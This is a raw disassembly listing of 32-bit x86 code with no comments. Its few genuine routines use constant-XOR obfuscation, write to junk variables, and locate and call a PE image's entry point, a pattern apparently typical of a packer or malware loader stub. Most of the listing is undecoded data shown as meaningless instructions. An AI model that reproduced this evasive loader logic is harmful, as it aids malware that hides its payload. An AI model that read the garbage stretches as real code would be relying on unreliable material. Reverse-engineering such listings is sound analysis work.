  40f8f6:	retf   0x6b8b
  40f8f9:	xor    al,0xec
  40f8fb:	push   es
  40f8fc:	je     0x40f8dd
  40f8fe:	mov    ds:0x1da0425d,eax
  40f903:	dec    edi
  40f904:	data16 arpl cx,bp
  40f907:	aad    0x27
  40f909:	adc    cl,0x22
  40f90c:	pusha  
  40f90d:	or     edi,DWORD PTR [ecx+0x3959e5da]
  40f913:	outs   dx,BYTE PTR ds:[esi]
  40f914:	hlt    
  40f915:	out    dx,al
  40f916:	ins    BYTE PTR es:[edi],dx
  40f917:	pop    ecx
  40f918:	mov    ebx,0x4e753402
  40f91d:	test   BYTE PTR [edi],0xc0
  40f920:	out    0xe4,eax
  40f922:	add    al,0xe5
  40f924:	lods   eax,DWORD PTR ds:[esi]
  40f925:	add    al,0x39
  40f927:	and    DWORD PTR ds:0x4336ab,0x433627
  40f931:	xor    al,0x45
  40f933:	cmp    al,0xc3
  40f935:	jne    0x40f9bc
  40f93b:	adc    ecx,edx
  40f93d:	mov    eax,DWORD PTR [ebp+0x8]
  40f940:	movzx  ecx,WORD PTR ds:0x4335df
  40f947:	add    DWORD PTR ds:0x4335c7,ecx
  40f94d:	mov    ecx,DWORD PTR [ebp+0x8]
  40f950:	add    ecx,DWORD PTR [eax+0x3c]
  40f953:	sub    DWORD PTR ds:0x4336af,0x5c72
  40f95d:	mov    edx,0x7510853
  40f962:	add    DWORD PTR ds:0x433697,0x767c
  40f96c:	mov    DWORD PTR [ebp+0x8],ecx
  40f96f:	adc    eax,DWORD PTR ds:0x433627
  40f975:	mov    eax,DWORD PTR [ebp-0x4]
  40f978:	movzx  ecx,BYTE PTR ds:0x4336e3
  40f97f:	adc    ecx,DWORD PTR ds:0x43362b
  40f985:	mov    DWORD PTR ds:0x4336e3,ecx
  40f98b:	xor    eax,edx
  40f98d:	push   esi
  40f98e:	xor    esi,0x76d3
  40f994:	mov    esi,DWORD PTR [ebp+0x8]
  40f997:	mov    ecx,0x32729a
  40f99c:	add    eax,ecx
  40f99e:	cmp    DWORD PTR [esi+0x54],eax
  40f9a1:	pop    esi
  40f9a2:	je     0x40f9b0
  40f9a8:	mov    eax,DWORD PTR [ebp+0x8]
  40f9ab:	jmp    0x40f9c9
  40f9b0:	mov    eax,DWORD PTR [ebp-0x4]
  40f9b3:	xor    eax,edx
  40f9b5:	add    eax,ecx
  40f9b7:	jmp    0x40f9c9
  40f9bc:	mov    eax,DWORD PTR [ebp-0x4]
  40f9bf:	xor    eax,0x7510853
  40f9c4:	add    eax,0x32729a
  40f9c9:	leave  
  40f9ca:	ret    0x4
  40f9cd:	push   ebp
  40f9ce:	mov    ebp,esp
  40f9d0:	push   ecx
  40f9d1:	mov    ecx,DWORD PTR [ebp+0x8]
  40f9d4:	mov    eax,0x7510853
  40f9d9:	or     DWORD PTR ds:0x433633,0x43362f
  40f9e3:	xor    ecx,eax
  40f9e5:	add    DWORD PTR ds:0x4336a3,0x6057
  40f9ef:	add    ecx,0x32729a
  40f9f5:	mov    DWORD PTR ds:0x433617,0x14d8
  40f9ff:	mov    DWORD PTR [ebp+0x10],ecx
  40fa02:	mov    ecx,0x737
  40fa07:	mov    DWORD PTR [ebp+0x8],0xf34ceb9
  40fa0e:	mov    DWORD PTR [ebp-0x4],0xf89c8538
  40fa15:	mov    DWORD PTR ds:0x43365b,edi
  40fa1b:	mov    ecx,0xf89c8534
  40fa20:	mov    DWORD PTR ds:0x4335c7,0x6b28
  40fa2a:	push   esi
  40fa2b:	mov    esi,DWORD PTR ds:0x4336df
  40fa31:	mov    DWORD PTR [ebp+0x10],0x70019fb
  40fa38:	mov    esi,DWORD PTR [ebp-0x4]
  40fa3b:	cmp    ecx,esi
  40fa3d:	mov    DWORD PTR ds:0x433663,0x9e9
  40fa47:	je     0x40fa8c
  40fa4d:	mov    esi,DWORD PTR [ebp+0xc]
  40fa50:	sbb    DWORD PTR ds:0x4336b3,0x433627
  40fa5a:	xor    ecx,eax
  40fa5c:	xor    DWORD PTR ds:0x43369b,0x6006
  40fa66:	xor    esi,eax
  40fa68:	lea    ecx,[esi+ecx*1+0x32729a]
  40fa6f:	xor    DWORD PTR ds:0x43362f,0x4a94
  40fa79:	xor    ecx,eax
  40fa7b:	cmp    ecx,0xf89c8525
  40fa81:	jne    0x40fa2b
  40fa87:	jmp    0x410084
  40fa8c:	add    DWORD PTR ds:0x43369b,ebx
  40fa92:	add    ecx,0xffcd8d66
  40fa98:	xor    DWORD PTR ds:0x433623,ebx
  40fa9e:	mov    esi,ecx
  40faa0:	or     DWORD PTR ds:0x4335df,0x3fd0
  40faaa:	xor    esi,eax
  40faac:	mov    DWORD PTR ds:0x4335df,0x62c3
  40fab6:	add    esi,DWORD PTR [ebp+0x8]
  40fab9:	mov    DWORD PTR [ebp+0x8],esi
  40fabc:	or     esi,DWORD PTR ds:0x4335df
  40fac2:	mov    esi,DWORD PTR [ebp+0x8]
  40fac5:	xor    esi,ecx
  40fac7:	xor    esi,eax
  40fac9:	mov    eax,DWORD PTR [edx+0x194]
  40facf:	jmp    0x40fd9e
  40fad4:	daa    
  40fad5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fad6:	or     DWORD PTR [esi-0x5a484d63],eax
  40fadc:	scas   al,BYTE PTR es:[edi]
  40fadd:	add    al,0x3b
  40fadf:	clc    
  40fae0:	push   0x50
  40fae2:	and    al,0xcb
  40fae4:	cmp    eax,0xae7c7cb3
  40fae9:	jle    0x40fb67
  40faeb:	jl     0x40fb26
  40faed:	xchg   ecx,eax
  40faee:	shl    BYTE PTR [eax+ebx*8-0x439ca0b],0x29
  40faf6:	adc    eax,0xef9c65f1
  40fafb:	dec    esi
  40fafc:	inc    ecx
  40fafd:	xor    DWORD PTR ss:[esi-0x3eccf90d],0x24
  40fb05:	adc    al,0xf2
  40fb07:	inc    ebp
  40fb08:	stos   DWORD PTR es:[edi],eax
  40fb09:	(bad)  
  40fb0a:	clc    
  40fb0b:	add    eax,0x94d4b7a5
  40fb10:	jp     0x40fa9f
  40fb12:	push   esi
  40fb13:	lahf   
  40fb14:	in     al,0x3
  40fb16:	test   BYTE PTR [edi-0x13658072],bl
  40fb1c:	push   edx
  40fb1d:	or     al,BYTE PTR [ebx+0x21f06233]
  40fb23:	sbb    BYTE PTR [esi+0x53],bh
  40fb26:	lock lods al,BYTE PTR ds:[esi]
  40fb28:	repz xor esi,0xffffffc0
  40fb2c:	push   es
  40fb2d:	jge    0x40fb5f
  40fb2f:	jb     0x40fafe
  40fb31:	aam    0xf5
  40fb33:	jne    0x40fb0a
  40fb35:	sub    ebx,DWORD PTR [ecx+0xfe89b29]
  40fb3b:	std    
  40fb3c:	xor    al,0xf8
  40fb3e:	mov    ax,ds:0xd08dddc5
  40fb44:	inc    edx
  40fb45:	pop    edx
  40fb46:	shl    BYTE PTR [edi-0x64],cl
  40fb49:	mov    al,0xb9
  40fb4b:	shl    DWORD PTR [ebx],cl
  40fb4d:	js     0x40fb4d
  40fb4f:	jnp    0x40fb55
  40fb51:	ins    DWORD PTR es:[edi],dx
  40fb52:	fisub  WORD PTR [esp+eax*8-0x2161a605]
  40fb59:	retf   
  40fb5a:	add    DWORD PTR [edx-0x43bfd66d],esp
  40fb60:	inc    edx
  40fb61:	inc    esp
  40fb62:	dec    eax
  40fb63:	or     DWORD PTR [edx+eiz*4+0x2a],eax
  40fb67:	jnp    0x40fb57
  40fb69:	in     eax,0x65
  40fb6b:	dec    esp
  40fb6c:	inc    esp
  40fb6d:	fwait
  40fb6e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fb6f:	icebp  
  40fb70:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fb71:	sub    al,BYTE PTR [edx+0xf]
  40fb74:	pop    esp
  40fb75:	push   ebx
  40fb76:	mov    ebp,0x65472702
  40fb7b:	pop    edx
  40fb7c:	bound  ebx,QWORD PTR [esi+0x63]
  40fb7f:	jbe    0x40fbbe
  40fb81:	push   0x5c63244f
  40fb86:	inc    ebx
  40fb87:	imul   esi,edx,0x16d50310
  40fb8d:	bound  ecx,QWORD PTR [eax+0x64d61467]
  40fb93:	cmp    DWORD PTR [ecx+ebx*8-0x1c],0x17309d7e
  40fb9b:	mov    edi,0xb96ba378
  40fba0:	pop    ebp
  40fba1:	and    al,BYTE PTR [edx-0x62]
  40fba4:	fmul   DWORD PTR [ebx]
  40fba6:	outs   dx,DWORD PTR ds:[esi]
  40fba7:	mov    esp,DWORD PTR [ebp+0x1f]
  40fbaa:	push   0xffffffad
  40fbac:	sbb    eax,0xc4641ece
  40fbb1:	push   ebp
  40fbb2:	(bad)  
  40fbb3:	or     eax,ecx
  40fbb5:	retf   
  40fbb6:	jp     0x40fb72
  40fbb8:	mov    ebp,0xbee7bd67
  40fbbd:	inc    esi
  40fbbe:	fdivr  DWORD PTR [edx-0x64fde74f]
  40fbc4:	mov    ebp,0x57c6bbb5
  40fbc9:	pop    ss
  40fbca:	mov    al,0x92
  40fbcc:	loop   0x40fc42
  40fbce:	jge    0x40fb50
  40fbd0:	xchg   ebp,eax
  40fbd1:	fst    DWORD PTR [eax]
  40fbd3:	or     eax,0x1e02c432
  40fbd8:	mov    ah,0x12
  40fbda:	mov    cl,0x9a
  40fbdc:	mov    ebp,0x3fb8dc5a
  40fbe1:	xchg   ebp,eax
  40fbe2:	and    al,0x99
  40fbe4:	cmp    bh,BYTE PTR [edx]
  40fbe6:	pushf  
  40fbe7:	jae    0x40fc16
  40fbe9:	push   edx
  40fbea:	inc    esi
  40fbeb:	int3   
  40fbec:	ins    DWORD PTR es:[edi],dx
  40fbed:	mov    bh,0x8b
  40fbef:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fbf0:	inc    ecx
  40fbf1:	lods   eax,DWORD PTR ds:[esi]
  40fbf2:	xlat   BYTE PTR ds:[ebx]
  40fbf3:	cmp    esp,esi
  40fbf5:	std    
  40fbf6:	scas   eax,DWORD PTR es:[edi]
  40fbf7:	sub    ebx,DWORD PTR [ebp-0x4732615d]
  40fbfd:	jbe    0x40fbc1
  40fbff:	push   edx
  40fc00:	retf   0x9b90
  40fc03:	push   ebx
  40fc04:	and    DWORD PTR [eax],ecx
  40fc06:	fcomp  st(0)
  40fc08:	fistp  DWORD PTR [edi+0x8f18c94]
  40fc0e:	imul   edi,edi,0xffffff84
  40fc11:	hlt    
  40fc12:	in     al,dx
  40fc13:	lods   al,BYTE PTR ds:[esi]
  40fc14:	jg     0x40fc55
  40fc16:	jbe    0x40fbee
  40fc18:	retf   0xb3b8
  40fc1b:	mov    esp,0xfb2eff15
  40fc20:	aaa    
  40fc21:	dec    ecx
  40fc22:	sbb    al,0xa8
  40fc24:	loope  0x40fbc8
  40fc26:	push   cs
  40fc27:	sub    al,0xc9
  40fc29:	mov    al,ds:0x8856b2f1
  40fc2e:	into   
  40fc2f:	pop    es
  40fc30:	sti    
  40fc31:	sbb    cl,BYTE PTR [ebp-0x62d1606c]
  40fc37:	or     eax,DWORD PTR [ebx]
  40fc39:	pushf  
  40fc3a:	hlt    
  40fc3b:	imul   edx,DWORD PTR ds:0xce21f8ba,0x3af74fb2
  40fc45:	popa   
  40fc46:	or     al,0xcc
  40fc48:	fadd   QWORD PTR [ecx]
  40fc4a:	ret    0x762f
  40fc4d:	mov    eax,ds:0x1f1c6e2f
  40fc52:	sti    
  40fc53:	xchg   BYTE PTR [ebp-0x51],bh
  40fc56:	in     eax,0x64
  40fc58:	gs cld 
  40fc5a:	cmp    DWORD PTR ds:0x3ca9ab2,esi
  40fc60:	add    al,0x55
  40fc62:	scas   eax,DWORD PTR es:[edi]
  40fc63:	dec    ebx
  40fc64:	retf   0xc430
  40fc67:	xchg   ebx,eax
  40fc68:	pushf  
  40fc69:	(bad)  
  40fc6a:	cli    
  40fc6b:	and    al,0x64
  40fc6d:	add    al,0xfc
  40fc6f:	and    eax,0x107b692d
  40fc74:	and    al,0xf
  40fc76:	mov    ch,0x7c
  40fc78:	in     al,dx
  40fc79:	ins    DWORD PTR es:[edi],dx
  40fc7a:	shr    BYTE PTR [ecx-0x20],1
  40fc7d:	pop    eax
  40fc7e:	ins    DWORD PTR es:[edi],dx
  40fc7f:	pop    ds
  40fc80:	rcr    bl,1
  40fc82:	inc    ebp
  40fc83:	xchg   BYTE PTR [eax],al
  40fc85:	mov    ebp,0x2c8d850d
  40fc8a:	fisub  DWORD PTR [esi+0x3fce29c]
  40fc90:	ja     0x40fcb8
  40fc92:	push   0xffffffb1
  40fc94:	mov    eax,0x5e668513
  40fc99:	je     0x40fc48
  40fc9b:	ror    DWORD PTR [edx-0x52],cl
  40fc9e:	xor    BYTE PTR [esi-0x5fd8d2f1],dl
  40fca4:	sub    DWORD PTR [esi],esi
  40fca6:	cmp    eax,0x8d93667d
  40fcab:	pop    esi
  40fcac:	imul   esi,DWORD PTR [ecx],0x7dc87536
  40fcb2:	mov    esp,0x4c8f34a5
  40fcb7:	ror    BYTE PTR [ebx+0x89c0d72],cl
  40fcbd:	cmc    
  40fcbe:	push   ecx
  40fcbf:	gs (bad) 
  40fcc1:	or     DWORD PTR [ecx],ebp
  40fcc3:	fist   WORD PTR [edi]
  40fcc5:	neg    BYTE PTR [eax]
  40fcc7:	sub    esi,DWORD PTR [ebp+0x73]
  40fcca:	(bad)  
  40fccb:	fidiv  WORD PTR [ecx-0x3e]
  40fcce:	mov    eax,0x7ac12e11
  40fcd3:	mov    ch,BYTE PTR [esi+0x32a36993]
  40fcd9:	jae    0x40fcdb
  40fcdb:	push   eax
  40fcdc:	lods   eax,DWORD PTR ds:[esi]
  40fcdd:	test   BYTE PTR [edi-0x64],dl
  40fce0:	mov    eax,ds:0xe36c54bc
  40fce5:	push   ecx
  40fce6:	test   eax,0xa750b12d
  40fceb:	out    0x48,eax
  40fced:	jnp    0x40fc9a
  40fcef:	inc    esi
  40fcf0:	mov    gs,WORD PTR [edx+0x17]
  40fcf3:	sbb    cl,BYTE PTR [edi-0x12a111c3]
  40fcf9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fcfa:	pop    edi
  40fcfb:	bound  eax,QWORD PTR [ecx+0x7c]
  40fcfe:	jp     0x40fd4a
  40fd00:	jmp    0x40fcf6
  40fd02:	push   edi
  40fd03:	jnp    0x40fd05
  40fd05:	ret    
  40fd06:	fsub   QWORD PTR [ebp+0x26]
  40fd09:	out    0xaa,eax
  40fd0b:	stc    
  40fd0c:	lds    esp,FWORD PTR [eax+0x704523e3]
  40fd12:	sbb    al,BYTE PTR ds:0x4ed563ba
  40fd18:	mov    ecx,0x6fb846ff
  40fd1d:	mov    esp,DWORD PTR [esi-0x112b6f6]
  40fd23:	push   edx
  40fd24:	cmp    ebp,edi
  40fd26:	pushf  
  40fd27:	pop    ecx
  40fd28:	pop    eax
  40fd29:	out    dx,eax
  40fd2a:	dec    esi
  40fd2b:	ss mov edx,0x45b2e92b
  40fd31:	leave  
  40fd32:	mov    dl,0x50
  40fd34:	inc    eax
  40fd35:	test   al,0x30
  40fd37:	retf   
  40fd38:	push   eax
  40fd39:	fwait
  40fd3a:	int3   
  40fd3b:	sahf   
  40fd3c:	inc    edi
  40fd3d:	cdq    
  40fd3e:	stos   DWORD PTR es:[edi],eax
  40fd3f:	mov    ebx,0x65261c03
  40fd44:	pop    edi
  40fd45:	add    bh,BYTE PTR [esi]
  40fd47:	pop    edx
  40fd48:	fwait
  40fd49:	mov    al,BYTE PTR [edx-0x4aeb33f9]
  40fd4f:	jecxz  0x40fd09
  40fd51:	mov    ebp,0x4cdbad81
  40fd56:	enter  0xacaf,0x70
  40fd5a:	ins    BYTE PTR es:[edi],dx
  40fd5b:	sahf   
  40fd5c:	or     DWORD PTR [esi],ebx
  40fd5e:	xchg   edx,eax
  40fd5f:	xlat   BYTE PTR ds:[ebx]
  40fd60:	fcmovb st,st(7)
  40fd62:	(bad)  
  40fd66:	pop    es
  40fd67:	xchg   esi,eax
  40fd68:	ss mov dl,0x51
  40fd6b:	imul   ebx
  40fd6d:	fwait
  40fd6e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fd6f:	push   cs
  40fd70:	mov    dh,0x97
  40fd72:	(bad)  
  40fd73:	out    dx,eax
  40fd74:	aaa    
  40fd75:	dec    eax
  40fd76:	fstp   TBYTE PTR cs:[ebx+0x2642a7]
  40fd7d:	pushf  
  40fd7e:	and    cl,BYTE PTR [edx]
  40fd80:	push   cs
  40fd81:	fmul   QWORD PTR [eax+ebx*4-0xc]
  40fd85:	popf   
  40fd86:	push   0x56
  40fd88:	popf   
  40fd89:	mov    cl,0x3
  40fd8b:	jnp    0x40fdeb
  40fd8d:	mov    ecx,DWORD PTR [ebx-0x24]
  40fd90:	outs   dx,BYTE PTR ds:[esi]
  40fd91:	popa   
  40fd92:	sbb    al,0xf5
  40fd94:	jecxz  0x40fd32
  40fd96:	stc    
  40fd97:	data16 cli 
  40fd99:	sbb    eax,0xa241660e
  40fd9e:	mov    ecx,DWORD PTR [eax]
  40fda0:	adc    DWORD PTR ds:0x4335df,edx
  40fda6:	mov    eax,DWORD PTR [ecx+0x3c]
  40fda9:	mov    eax,DWORD PTR [eax+ecx*1+0x28]
  40fdad:	add    eax,ecx
  40fdaf:	mov    DWORD PTR [ebp+0x8],esi
  40fdb2:	mov    DWORD PTR [ebp+0x10],eax
  40fdb5:	jmp    0x410084
  40fdba:	in     al,0xad
  40fdbc:	jae    0x40fd87
  40fdbe:	jge    0x40fd89
  40fdc0:	bound  edi,QWORD PTR [ebp-0x71547538]
  40fdc6:	xor    DWORD PTR [esi],ebp
  40fdc8:	repnz jecxz 0x40fe3a
  40fdcb:	mov    ebp,0x7eae7c7c
  40fdd0:	jl     0x40fe4e
  40fdd2:	pop    ebp
  40fdd3:	xchg   ebp,eax
  40fdd4:	and    bl,BYTE PTR [ebp-0x6a2215d9]
  40fdda:	lods   al,BYTE PTR ds:[esi]
  40fddb:	in     eax,0x71
  40fddd:	es (bad) 
  40fddf:	mov    ebx,0x2fff5a2b
  40fde4:	(bad)  
  40fde5:	ds std 
  40fde7:	adc    eax,0x58c85ba3
  40fdec:	retf   0xc004
  40fdef:	cwde   
  40fdf0:	pop    es
  40fdf1:	mov    edx,0xaef6f93e
  40fdf6:	aaa    
  40fdf7:	arpl   WORD PTR [ebx],di
  40fdf9:	pop    eax
  40fdfa:	outs   dx,BYTE PTR ds:[esi]
  40fdfb:	call   0x8751:0x8eba3603
  40fe02:	les    esi,FWORD PTR [ebx+0x64]
  40fe05:	fisttp QWORD PTR [edx]
  40fe07:	xor    eax,0xb54ff316
  40fe0c:	xor    edx,edx
  40fe0e:	fiadd  DWORD PTR [ebp-0x11e5d2f2]
  40fe14:	sti    
  40fe15:	(bad)  
  40fe16:	ret    0xa73e
  40fe19:	icebp  
  40fe1a:	lds    ebp,FWORD PTR [ecx-0x215878c7]
  40fe20:	or     eax,0x482e3d20
  40fe25:	add    ah,BYTE PTR [ebp+0x53edbe9b]
  40fe2b:	(bad)  
  40fe2c:	dec    ebx
  40fe2d:	pop    es
  40fe2e:	jle    0x40fe85
  40fe30:	std    
  40fe31:	jns    0x40fe12
  40fe33:	repnz sahf 
  40fe35:	push   ebp
  40fe36:	jge    0x40fe0d
  40fe38:	mov    cl,0xb3
  40fe3a:	loopne 0x40fe1a
  40fe3c:	sahf   
  40fe3d:	jecxz  0x40fe31
  40fe3f:	div    DWORD PTR [bp+si+0x683c]
  40fe44:	jge    0x40fe29
  40fe46:	push   esi
  40fe47:	xlat   BYTE PTR ds:[ebx]
  40fe48:	mov    dl,0x36
  40fe4a:	nop
  40fe4b:	xor    eax,0x14e2e81c
  40fe50:	cs (bad) 
  40fe52:	cmp    al,0x5f
  40fe54:	xchg   esi,eax
  40fe55:	int3   
  40fe56:	adc    dh,ch
  40fe58:	(bad)  
  40fe59:	cs pop ebp
  40fe5b:	jg     0x40fded
  40fe5d:	inc    edi
  40fe5e:	push   esi
  40fe5f:	test   eax,0x6dd88fc7
  40fe64:	mov    ebx,0x83dbde8e
  40fe69:	loope  0x40fe67
  40fe6b:	rcl    ch,1
  40fe6d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fe6e:	or     DWORD PTR [ebp-0x62036a0e],ebp
  40fe74:	xchg   esp,eax
  40fe75:	test   al,0xfd
  40fe77:	sub    al,0x1
  40fe79:	mov    ch,0xd3
  40fe7b:	sub    ebp,DWORD PTR ds:[esi-0x7ea47c84]
  40fe82:	jp     0x40feb6
  40fe84:	mul    BYTE PTR [ebx+0x5599916]
  40fe8a:	mov    al,ds:0x26281d54
  40fe8f:	mov    al,0xc9
  40fe91:	das    
  40fe92:	mov    ebp,0xa0b8a014
  40fe97:	addr16 cwde 
  40fe99:	dec    ebx
  40fe9a:	or     al,0xf
  40fe9c:	pusha  
  40fe9d:	mov    ebp,0xcb713718
  40fea2:	cmc    
  40fea3:	or     al,0x25
  40fea5:	xchg   edx,eax
  40fea6:	inc    esi
  40fea7:	lock cmp cl,BYTE PTR [edi]
  40feaa:	fldcw  WORD PTR [esi-0x34451907]
  40feb0:	or     ah,BYTE PTR es:[ebp-0x4f]
  40feb4:	add    BYTE PTR [esp+ebx*4],0x42
  40feb8:	in     al,0x71
  40feba:	mov    esi,0x1b602b21
  40febf:	outs   dx,DWORD PTR ds:[esi]
  40fec0:	mov    esp,0x34cb9f5c
  40fec5:	pop    esi
  40fec6:	in     al,0x18
  40fec8:	push   ebp
  40fec9:	jmp    0xe777d51b
  40fece:	xchg   ecx,eax
  40fecf:	aam    0xba
  40fed1:	out    dx,eax
  40fed2:	sub    bh,BYTE PTR [esi+eiz*4+0x3e]
  40fed6:	mov    WORD PTR [eax],ss
  40fed8:	dec    ecx
  40fed9:	call   0x329c3bfa
  40fede:	jle    0x40fec8
  40fee0:	mov    ah,0x1d
  40fee2:	data16 jl 0x40ff4f
  40fee5:	pop    esi
  40fee6:	dec    edx
  40fee7:	(bad)  [esi-0x4]
  40feea:	es mov bl,0x34
  40feed:	push   ss
  40feee:	ds fwait
  40fef0:	pop    ds
  40fef1:	ins    BYTE PTR es:[edi],dx
  40fef2:	push   cs
  40fef3:	or     bh,dl
  40fef5:	jecxz  0x40feb7
  40fef7:	and    cl,BYTE PTR [esi+0x18ea23f6]
  40fefd:	cmp    esi,DWORD PTR [esi+0x8]
  40ff00:	(bad)  
  40ff01:	pop    esp
  40ff02:	cmc    
  40ff03:	(bad)  
  40ff04:	pop    ds
  40ff05:	fsubp  st(4),st
  40ff07:	pushf  
  40ff08:	mov    ecx,0xf4f9dfcf
  40ff0d:	mov    cl,0x9a
  40ff0f:	loop   0x40ff16
  40ff11:	inc    ecx
  40ff12:	dec    ecx
  40ff13:	push   esp
  40ff14:	cmp    eax,0x7a5148c1
  40ff19:	inc    ebx
  40ff1a:	inc    ebp
  40ff1b:	dec    ecx
  40ff1c:	out    dx,eax
  40ff1d:	sbb    eax,DWORD PTR [edx]
  40ff1f:	popf   
  40ff20:	fisttp WORD PTR [ebp-0x5cb9e70d]
  40ff26:	ja     0x40ff17
  40ff28:	pop    eax
  40ff29:	or     DWORD PTR [ecx],edi
  40ff2b:	(bad)  
  40ff2c:	in     al,0xa6
  40ff2e:	(bad)  
  40ff30:	aad    0x2f
  40ff32:	push   0xfffffff1
  40ff34:	lods   al,BYTE PTR ds:[esi]
  40ff35:	outs   dx,BYTE PTR ds:[esi]
  40ff36:	adc    BYTE PTR [esi+0x7b080a1b],al
  40ff3c:	rcr    BYTE PTR ds:0x1067ebc7,cl
  40ff42:	push   ecx
  40ff43:	xor    ecx,DWORD PTR gs:[eax+0x4ce68bf5]
  40ff4a:	hlt    
  40ff4b:	les    edx,FWORD PTR [ebp+0x7f]
  40ff4e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ff4f:	jo     0x40fee1
  40ff51:	not    DWORD PTR [eax+0x23]
  40ff54:	or     al,0xd7
  40ff56:	inc    edx
  40ff57:	dec    ebx
  40ff58:	scas   al,BYTE PTR es:[edi]
  40ff59:	jbe    0x40feed
  40ff5b:	js     0x40ff30
  40ff5d:	push   ss
  40ff5e:	cld    
  40ff5f:	ret    
  40ff60:	jnp    0x40ffd6
  40ff62:	and    al,0xad
  40ff64:	(bad)  
  40ff65:	sub    esi,DWORD PTR [edi]
  40ff67:	pop    eax
  40ff68:	jnp    0x40ffe0
  40ff6a:	lahf   
  40ff6b:	loope  0x40ffb9
  40ff6d:	popf   
  40ff6e:	adc    eax,0xf17b3827
  40ff73:	jge    0x40ffc2
  40ff75:	ins    DWORD PTR es:[edi],dx
  40ff76:	sub    eax,0x9aa2a2b8
  40ff7b:	dec    edi
  40ff7c:	hlt    
  40ff7d:	push   ebp
  40ff7e:	add    ebp,DWORD PTR [ecx-0x493d42ff]
  40ff84:	loop   0x40ffcd
  40ff86:	jno    0x40ff85
  40ff88:	sbb    edx,0xffffffc9
  40ff8b:	inc    esi
  40ff8c:	mov    ebx,0x40a84b9c
  40ff91:	dec    ecx
  40ff92:	add    ebp,DWORD PTR [ecx+0x68ecb784]
  40ff98:	rcl    BYTE PTR [eax+ebx*8],0x2e
  40ff9c:	std    
  40ff9d:	xchg   edx,eax
  40ff9e:	das    
  40ff9f:	inc    eax
  40ffa0:	mov    bh,0xca
  40ffa2:	jbe    0x40ff78
  40ffa4:	mov    bl,0x24
  40ffa6:	inc    ebp
  40ffa7:	dec    esp
  40ffa8:	pop    ebp
  40ffa9:	std    
  40ffaa:	aaa    
  40ffab:	jecxz  0x40ff2f
  40ffad:	pop    ebx
  40ffae:	sub    BYTE PTR [ecx-0x1f204f93],bh
  40ffb4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ffb5:	in     al,0xff
  40ffb7:	pop    ebp
  40ffb8:	mov    al,0x26
  40ffba:	mov    eax,0x6ffb95e2
  40ffbf:	sub    cl,BYTE PTR [esi-0x34]
  40ffc2:	iret   
  40ffc3:	inc    ebx
  40ffc4:	add    eax,0xe18a59a7
  40ffc9:	push   esi
  40ffca:	sbb    BYTE PTR [ebx+0x38],bl
  40ffcd:	adc    BYTE PTR [esi+0x762aa478],dl
  40ffd3:	popw   es
  40ffd5:	jnp    0x40ffb2
  40ffd7:	xor    DWORD PTR [ebx+0x1793c629],ebp
  40ffdd:	mov    edx,0x23bc611b
  40ffe2:	pop    edx
  40ffe3:	push   esp
  40ffe4:	cmp    bh,BYTE PTR [edi]
  40ffe6:	es das 
  40ffe8:	loopne 0x410008
  40ffea:	aad    0xe5
  40ffec:	sub    DWORD PTR [edx+0x26],0xffffffd9
  40fff0:	jne    0x40ffe7
  40fff2:	into   
  40fff3:	cmp    BYTE PTR [edi-0x33],ah
  40fff6:	sahf   
  40fff7:	inc    esi
  40fff8:	pop    esp
  40fff9:	loopne 0x40ff85
  40fffb:	ja     0x41000c
  40fffd:	inc    ebx
  40fffe:	nop
  40ffff:	jmp    0xfc688f91
  410004:	(bad)  
  410005:	xchg   esi,eax
  410006:	add    DWORD PTR [ebp-0x6b],0x83f7118f
  41000d:	sbb    BYTE PTR [eax-0x6d],bl
  410010:	mov    eax,0xac0795f6
  410015:	enter  0x1b9e,0x94
  410019:	and    edi,DWORD PTR [edx]
  41001b:	call   0xfb9a:0x4ecd7d09
  410022:	std    
  410023:	sbb    eax,0xe958ef21
  410028:	outs   dx,BYTE PTR ds:[esi]
  410029:	pop    eax
  41002a:	lods   eax,DWORD PTR ds:[esi]
  41002b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41002c:	xor    BYTE PTR [ebp+0x6e03e825],bh
  410032:	jg     0x41007a
  410034:	xchg   esi,eax
  410035:	or     ch,BYTE PTR [edi+0x30f048f6]
  41003b:	sbb    bh,BYTE PTR [edi]
  41003d:	and    al,0xa2
  41003f:	ret    0x7271
  410042:	cmovo  edx,DWORD PTR [edi-0x27]
  410046:	rol    BYTE PTR [ebx-0x1854bb47],0xed
  41004d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41004e:	or     DWORD PTR [eax],edi
  410050:	xor    al,0xcc
  410052:	lea    ecx,[esi+0x46863b8b]
  410058:	push   ebp
  410059:	aam    0xb9
  41005b:	adc    DWORD PTR [edi+ebx*8],ebx
  41005e:	mov    eax,0x47d9c264
  410063:	test   eax,0xdaadcf5c
  410068:	hlt    
  410069:	cmp    edi,DWORD PTR [edx-0x71e401c3]
  41006f:	lods   eax,DWORD PTR ds:[esi]
  410070:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410071:	inc    esi
  410072:	push   ecx
  410073:	ret    0xc697
  410076:	test   BYTE PTR [ebx+ecx*2-0xa],0xab
  41007b:	dec    ebp
  41007c:	or     eax,0xf1c465d7
  410081:	inc    edi
  410082:	in     eax,dx
  410083:	in     al,dx
  410084:	mov    eax,DWORD PTR [ebp+0x10]
  410087:	pop    esi
  410088:	test   eax,eax
  41008a:	je     0x4100ae
  410090:	push   DWORD PTR ds:0x413bee
  410096:	push   DWORD PTR ds:0x41399a
  41009c:	mov    eax,DWORD PTR [edx+0x194]
  4100a2:	push   DWORD PTR [eax]
  4100a4:	mov    eax,DWORD PTR [ebp+0x10]
  4100a7:	call   eax
  4100a9:	jmp    0x4100b1
  4100ae:	mov    eax,DWORD PTR [ebp+0x10]
  4100b1:	leave  
  4100b2:	ret    0xc
  4100b5:	push   ebp
  4100b6:	mov    ebp,esp
  4100b8:	sub    esp,0x30
  4100bb:	mov    DWORD PTR [ebp-0x4],0xf89c8535
  4100c2:	and    DWORD PTR ds:0x43365f,0x0
  4100cc:	jmp    0x4100dc
  4100d1:	mov    eax,ds:0x43365f
  4100d6:	inc    eax
  4100d7:	mov    ds:0x43365f,eax
